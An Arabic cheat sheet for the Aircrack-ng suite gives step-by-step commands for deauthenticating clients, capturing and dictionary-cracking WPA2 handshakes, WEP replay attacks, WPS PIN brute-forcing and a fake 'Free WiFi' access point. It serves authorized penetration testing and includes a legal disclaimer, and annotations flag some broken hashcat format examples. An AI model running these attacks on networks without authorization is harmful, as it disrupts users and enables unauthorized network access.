<a id="-aircrack-ng---wifi-hacking-suite-cheatsheet"></a>
# 📶 Aircrack-ng - مرجع سريع لحزمة اختبار أمن WiFi

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    WiFi Hacking Suite
```

> يكتب الرسم النصي اسم الحزمة بالإنجليزية؛ تتناول الصفحة أدوات تقييم أمن الشبكات اللاسلكية.

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هي حزمة Aircrack-ng](#-what-is-aircrack-ng)
- [التثبيت](#-installation)
- [وضع المراقبة (Monitor Mode)](#-monitor-mode)
- [الاستطلاع باستخدام airodump-ng](#-reconnaissance-airodump-ng)
- [إلغاء المصادقة باستخدام aireplay-ng](#-deauthentication-aireplay-ng)
- [اختبار استعادة مفاتيح WPA/WPA2](#-wpawpa2-cracking)
- [اختبار استعادة مفاتيح WEP](#-wep-cracking)
- [هجمات WPS](#-wps-attacks)
- [أدوات إضافية](#-additional-tools)
- [سير العمل الكامل للهجوم](#-complete-attack-workflow)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-aircrack-ng"></a>
## 🎯 ما هي حزمة Aircrack-ng

**Aircrack-ng** حزمة لتقييم أمن شبكات WiFi، وتضم:

- 📡 **airodump-ng** - التقاط الحزم واكتشاف الشبكات
- 💥 **aireplay-ng** - حقن الحزم وهجمات إلغاء المصادقة
- 🔓 **aircrack-ng** - اختبار استعادة مفاتيح WEP وWPA/WPA2
- 🔧 **airmon-ng** - تفعيل وضع المراقبة أو تعطيله
- 📝 **airodecap-ng** - فك تشفير حركة الشبكة الملتقطة

> **توضيح للأسماء والنطاق:** الاسم airodecap-ng في قائمة المصدر خطأ مطبعي؛ اسم الأداة الرسمي هو airdecap-ng كما يظهر في الأمثلة اللاحقة. وتشير أمثلة اختبار كلمات مرور WPA/WPA2 هنا إلى نمط المفتاح المشترك مسبقًا PSK؛ لا تعمم على كل أنماط المصادقة. [توثيق airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng)، [وصف aircrack-ng الرسمي](https://www.aircrack-ng.org/doku.php?id=aircrack-ng).

<a id="requirements"></a>
### المتطلبات

| المتطلب | الوصف |
|-------------|-------------|
| **محوّل شبكة لاسلكية** | يجب أن يدعم وضع المراقبة وحقن الحزم |
| **الشرائح المدعومة** | Atheros وRalink وبعض شرائح Realtek |
| **نظام التشغيل** | يوصي المصدر باستخدام Linux ‏(Kali) |

<a id="popular-compatible-adapters"></a>
### محوّلات شائعة متوافقة

| المحوّل | الشريحة | ملاحظات |
|---------|---------|-------|
| Alfa AWUS036ACH | RTL8812AU | ثنائي النطاق، قوي الأداء |
| Alfa AWUS036NHA | Atheros AR9271 | تقليدي وموثوق |
| TP-Link TL-WN722N v1 | Atheros AR9271 | خيار اقتصادي |

---

<a id="-installation"></a>
## 🚀 التثبيت

<a id="kali-linux-pre-installed"></a>
### Kali Linux (مثبّت مسبقًا)

```bash
# مثبّت مسبقًا؛ التحقق من الإصدار
aircrack-ng --version

# التحديث
sudo apt update && sudo apt install aircrack-ng
```

<a id="debianubuntu"></a>
### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

<a id="from-source"></a>
### التثبيت من الشيفرة المصدرية

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

<a id="-monitor-mode"></a>
## 📡 وضع المراقبة (Monitor Mode)

<a id="check-wireless-interface"></a>
### فحص الواجهة اللاسلكية

```bash
# عرض الواجهات اللاسلكية
iwconfig

# أو
iw dev

# أو
airmon-ng
```

<a id="enable-monitor-mode"></a>
### تفعيل وضع المراقبة

```bash
# الطريقة 1: airmon-ng (يوصي بها المصدر)
sudo airmon-ng start wlan0

# Output: Monitor mode enabled on wlan0mon

# الطريقة 2: يدويًا
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

> **ملاحظة على الواجهات:** اسما wlan0 وwlan0mon أمثلة وليسا اسمين مضمونين في كل نظام؛ قد يختلف اسم الواجهة وآلية إنشاء وضع المراقبة بحسب برنامج التشغيل. [توثيق airmon-ng الرسمي](https://www.aircrack-ng.org/doku.php?id=airmon-ng).

<a id="kill-interfering-processes"></a>
### إيقاف العمليات المتداخلة مع العمل

```bash
# إيقاف العمليات التي قد تتداخل مع العمل
sudo airmon-ng check kill

# أو يدويًا
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

<a id="disable-monitor-mode"></a>
### تعطيل وضع المراقبة

```bash
# إيقاف وضع المراقبة
sudo airmon-ng stop wlan0mon

# إعادة تشغيل NetworkManager
sudo systemctl start NetworkManager
```

<a id="change-channel"></a>
### تغيير القناة

```bash
# تعيين قناة محددة
sudo iwconfig wlan0mon channel 6

# أو باستخدام airmon-ng
sudo airmon-ng start wlan0 6
```

---

<a id="-reconnaissance-airodump-ng"></a>
## 🔍 الاستطلاع باستخدام airodump-ng

<a id="basic-scan"></a>
### استطلاع أساسي

```bash
# استطلاع جميع الشبكات
sudo airodump-ng wlan0mon

# Output:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

<a id="scan-specific-band"></a>
### استطلاع نطاق ترددي محدد

```bash
# نطاق 2.4GHz فقط
sudo airodump-ng --band g wlan0mon

# نطاق 5GHz فقط
sudo airodump-ng --band a wlan0mon

# كلا النطاقين
sudo airodump-ng --band abg wlan0mon
```

<a id="target-specific-network"></a>
### تحديد شبكة بعينها

```bash
# الترشيح حسب القناة وBSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# حفظ الالتقاط في ملف
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Creates: capture-01.cap, capture-01.csv, etc.
```

<a id="understanding-output"></a>
### فهم الخرج

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| الحقل | الوصف |
|-------|-------------|
| BSSID | عنوان MAC لنقطة الوصول (AP) |
| PWR | شدة الإشارة (الاقتراب من 0 يعني إشارة أقوى) |
| Beacons | عدد إطارات الإعلان (Beacons) |
| #Data | عدد حزم البيانات |
| CH | القناة |
| ENC | نوع التشفير (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | اسم الشبكة |
| STATION | عنوان MAC للعميل المتصل |

<a id="filter-options"></a>
### خيارات الترشيح

```bash
# عرض الشبكات المشفّرة فقط
sudo airodump-ng --encrypt wpa2 wlan0mon

# عرض شبكات WEP فقط
sudo airodump-ng --encrypt wep wlan0mon

# معرّف ESSID محدد
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

<a id="-deauthentication-aireplay-ng"></a>
## 💥 إلغاء المصادقة باستخدام aireplay-ng

<a id="why-deauth"></a>
### لماذا يُستخدم إلغاء المصادقة؟

يدفع إلغاء المصادقة العملاء إلى إعادة الاتصال، مما يتيح التقاط المصافحة الرباعية (4-way handshake) اللازمة لاختبار كلمات مرور WPA/WPA2.

> **حدود المثال:** إلغاء المصادقة محاولة لدفع عميل متصل إلى إعادة المصادقة؛ لا يضمن التقاط مصافحة في كل حالة، ولا يثبت وحده إمكانية استعادة كلمة المرور. [توثيق إلغاء المصادقة ومشكلاته](https://www.aircrack-ng.org/doku.php?id=deauthentication).

<a id="deauth-single-client"></a>
### إلغاء مصادقة عميل واحد

```bash
# إلغاء مصادقة عميل محدد
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : هجوم إلغاء المصادقة
# 5  : عدد مرات إلغاء المصادقة (0 = بلا توقف)
# -a : معرّف BSSID لنقطة الوصول
# -c : عنوان MAC للعميل
```

<a id="deauth-all-clients"></a>
### إلغاء مصادقة جميع العملاء

```bash
# إلغاء المصادقة بالبث العام (جميع العملاء)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# إرسال أكثر كثافة
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

<a id="check-for-handshake"></a>
### التحقق من التقاط المصافحة

```
# البحث في airodump-ng عن:
WPA handshake: AA:BB:CC:DD:EE:FF

# يظهر ذلك في الزاوية العلوية اليمنى
```

---

<a id="-wpawpa2-cracking"></a>
## 🔓 اختبار استعادة مفاتيح WPA/WPA2

<a id="complete-wpa2-attack-workflow"></a>
### سير عمل هجوم WPA2 الكامل

```bash
# الخطوة 1: تفعيل وضع المراقبة
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# الخطوة 2: استطلاع الشبكات
sudo airodump-ng wlan0mon

# الخطوة 3: تحديد شبكة بعينها والتقاط حزمها
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# الخطوة 4: إلغاء مصادقة العميل (طرفية جديدة)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# الخطوة 5: انتظار المصافحة (تظهر في airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# الخطوة 6: اختبار قائمة كلمات
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

<a id="dictionary-attack"></a>
### هجوم القاموس

```bash
# هجوم قاموس أساسي
aircrack-ng -w wordlist.txt capture-01.cap

# استخدام rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# عدة قوائم كلمات
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

<a id="specify-target-essid"></a>
### تحديد ESSID للشبكة الهدف

```bash
# إذا احتوى الالتقاط على عدة شبكات
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# أو حسب BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

<a id="using-hashcat-faster-gpu"></a>
### استخدام Hashcat (تسريع باستخدام GPU)

```bash
# تحويل cap إلى تنسيق Hashcat
aircrack-ng capture-01.cap -J hashcat_file
# Creates: hashcat_file.hccapx

# أو استخدام cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# اختبار الاستعادة باستخدام Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 for older hccap format
```

> **تصحيح للتنسيقات:** يخلط المصدر بين التنسيقات والخيارات: يصف توثيق Aircrack-ng الخيار `-j` بأنه يُنتج HCCAPX، والخيار `-J` بأنه يُنتج تنسيق Hashcat الأقدم. أما mode 22000 في Hashcat فيستخدم صيغة نصية تجمع PMKID وEAPOL، ولا يقبل ملف HCCAPX لمجرد تسميته بامتداد مناسب. لذلك لا تتوافق أمثلة التحويل والاستدعاء هنا كما كُتبت؛ بقيت الأوامر وأسماء الملفات كما في المصدر. [خيارات Aircrack-ng الرسمية](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)، [تنسيقات WPA/WPA2 في Hashcat](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2).

<a id="convert-formats"></a>
### تحويل التنسيقات

```bash
# تحويل CAP إلى HCCAPX ‏(Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# تحويل CAP إلى PCAP
editcap capture-01.cap output.pcap

# دمج عدة ملفات التقاط
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

<a id="-wep-cracking"></a>
## 🔐 اختبار استعادة مفاتيح WEP

> ⚠️ WEP قديم وغير آمن. يذكر المصدر أن معظم الشبكات تستخدم WPA2/WPA3 حاليًا.

<a id="wep-attack-types"></a>
### أنواع هجمات WEP

| الهجوم | الوصف |
|--------|-------------|
| ARP Replay | التقاط حزم ARP وإعادة إرسالها |
| Fake Auth | الارتباط بنقطة الوصول دون مفتاح |
| Fragmentation | توليد تدفق المفتاح (Keystream) |
| ChopChop | فك تشفير الحزم دون المفتاح |

<a id="basic-wep-attack"></a>
### هجوم WEP أساسي

```bash
# الخطوة 1: التقاط حركة الشبكة
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# الخطوة 2: المصادقة الوهمية
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# الخطوة 3: هجوم إعادة إرسال ARP
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# الخطوة 4: اختبار الاستعادة عند توفر متجهات IV كافية (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

<a id="aireplay-ng-attack-modes"></a>
### أنماط الهجوم في aireplay-ng

| النمط | الوصف |
|------|-------------|
| `-0` | إلغاء المصادقة |
| `-1` | مصادقة وهمية |
| `-2` | إعادة إرسال الحزم تفاعليًا |
| `-3` | إعادة إرسال طلبات ARP |
| `-4` | هجوم KoreK chopchop |
| `-5` | هجوم التجزئة |
| `-9` | اختبار الحقن |

---

<a id="-wps-attacks"></a>
## 🔓 هجمات WPS

<a id="using-reaver"></a>
### استخدام Reaver

```bash
# تثبيت Reaver
sudo apt install reaver

# هجوم WPS أساسي
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# مع تحديد القناة
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# هجوم Pixie-Dust (أسرع)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

<a id="using-bully"></a>
### استخدام Bully

```bash
# تثبيت Bully
sudo apt install bully

# هجوم أساسي
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

<a id="wash-find-wps-enabled-aps"></a>
### Wash (العثور على نقاط وصول تدعم WPS)

```bash
# استطلاع شبكات WPS
sudo wash -i wlan0mon

# Output shows:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

<a id="-additional-tools"></a>
## 🔧 أدوات إضافية

<a id="airbase-ng-fake-ap"></a>
### airbase-ng (نقطة وصول وهمية)

```bash
# إنشاء نقطة وصول وهمية
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# مع BSSID محدد
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

<a id="airdecap-ng-decrypt-captures"></a>
### airdecap-ng (فك تشفير الملفات الملتقطة)

```bash
# فك تشفير التقاط WPA بمفتاح معروف
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# فك تشفير التقاط WEP
airdecap-ng -w <wep_key> capture-01.cap
```

<a id="aircrack-ng-options"></a>
### خيارات aircrack-ng

```bash
# عرض جميع الخيارات
aircrack-ng --help

# استخدام عدة أنوية للمعالج
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# الوضع الهادئ
aircrack-ng -q -w wordlist.txt capture-01.cap

# تحديد ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

<a id="packetforge-ng-create-packets"></a>
### packetforge-ng (إنشاء الحزم)

```bash
# إنشاء حزمة ARP
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

<a id="-complete-attack-workflow"></a>
## 🎯 سير العمل الكامل للهجوم

<a id="wpa2-attack-step-by-step"></a>
### هجوم WPA2 خطوة بخطوة

```bash
# الطرفية 1: التحضير
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# التحقق من وضع المراقبة
iwconfig  # يُفترض أن يظهر wlan0mon

# الطرفية 1: استطلاع الشبكات
sudo airodump-ng wlan0mon
# تدوين BSSID وCH وESSID للشبكة الهدف

# الطرفية 1: تحديد الهدف والالتقاط
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# الطرفية 2: هجوم إلغاء المصادقة
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# Wait for "WPA handshake: XX:XX:XX:XX:XX:XX" in Terminal 1
# الضغط على Ctrl+C لإيقاف الالتقاط

# الطرفية 1: اختبار كلمة مرور المصافحة
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# أو باستخدام Hashcat (تسريع عبر GPU)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

> تنطبق ملاحظة اختلاف تنسيق HCCAPX عن مدخلات mode 22000 أيضًا على سطرَي Hashcat في سير العمل السابق؛ المثال محفوظ كما ورد في المصدر.

<a id="post-attack-cleanup"></a>
### التنظيف بعد الهجوم

```bash
# إيقاف وضع المراقبة
sudo airmon-ng stop wlan0mon

# إعادة تشغيل NetworkManager
sudo systemctl start NetworkManager

# تنظيف الملفات (اختياري)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="essential-commands"></a>
### الأوامر الأساسية

| الغرض | الأمر |
|---------|---------|
| تفعيل وضع المراقبة | `airmon-ng start wlan0` |
| إيقاف وضع المراقبة | `airmon-ng stop wlan0mon` |
| إيقاف العمليات المتداخلة | `airmon-ng check kill` |
| استطلاع الشبكات | `airodump-ng wlan0mon` |
| تحديد الشبكة الهدف | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| إلغاء المصادقة | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| اختبار استعادة مفتاح WPA | `aircrack-ng -w wordlist.txt capture.cap` |

<a id="attack-summary"></a>
### ملخص الهجمات

| الهجوم | التشفير | الطريقة |
|--------|------------|--------|
| هجوم القاموس | WPA/WPA2 | التقاط المصافحة ← اختبار قائمة كلمات |
| Reaver | WPS | تخمين رمز WPS PIN بالقوة الغاشمة |
| Pixie-Dust | WPS | هجوم WPS دون اتصال مباشر أثناء الحساب |
| ARP Replay | WEP | جمع متجهات التهيئة IVs ← استعادة المفتاح |

<a id="useful-wordlists"></a>
### قوائم كلمات مفيدة

| المسار | الوصف |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | شائعة الاستخدام في Kali |
| `/usr/share/wordlists/fasttrack.txt` | اختبار سريع |
| `/usr/share/seclists/Passwords/` | مجموعة SecLists |

<a id="troubleshooting"></a>
### استكشاف الأخطاء وإصلاحها

```bash
# تعذّر انتقال الواجهة إلى وضع المراقبة
sudo rfkill unblock wifi
sudo rfkill unblock all

# التحقق من دعم برنامج التشغيل للحقن
sudo aireplay-ng -9 wlan0mon

# لم تُلتقط مصافحة
# - الاقتراب من الجهاز الهدف
# - تجربة عملاء مختلفين
# - زيادة كثافة إلغاء المصادقة
# - الانتظار مدة أطول

# يعرض Airmon الرسالة "Found X processes"
sudo airmon-ng check kill
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ إخلاء مسؤولية قانوني

```
⚠️ تحذير: استخدم هذه الأدوات فقط على شبكات تملكها أو لديك 
تصريح كتابي صريح لاختبارها. الوصول غير المصرّح به إلى 
شبكات الحاسوب مخالف للقانون في معظم الولايات القضائية.

استخدمها بمسؤولية من أجل:
✅ التدقيق الأمني
✅ اختبار الاختراق بتصريح
✅ الأغراض التعليمية داخل بيئة مختبرية

لا تستخدمها أبدًا من أجل:
❌ الوصول غير المصرّح به إلى الشبكات
❌ سرقة بيانات الاعتماد
❌ أي أغراض خبيثة
```

---

<a id="-resources"></a>
## 📚 مصادر

- [موقع Aircrack-ng الرسمي](https://www.aircrack-ng.org/)
- [ويكي Aircrack-ng](https://www.aircrack-ng.org/doku.php)
- [توثيق WiFi في Hashcat](https://hashcat.net/wiki/)

<a id="related-cheatsheets"></a>
### مراجع سريعة ذات صلة
- [Hashcat](../../Hashcat/translations/README.ar.md)
- [Wireshark](../../Wireshark/translations/README.ar.md)
- [أوامر Linux](../../Linux-Commands/translations/README.ar.md)

---

<p align="center">
  <b>📶 إتقان اختبار أمن WiFi!</b><br>
  <i>Aircrack-ng - أداة لمختبر اختراق شبكات WiFi</i>
</p>
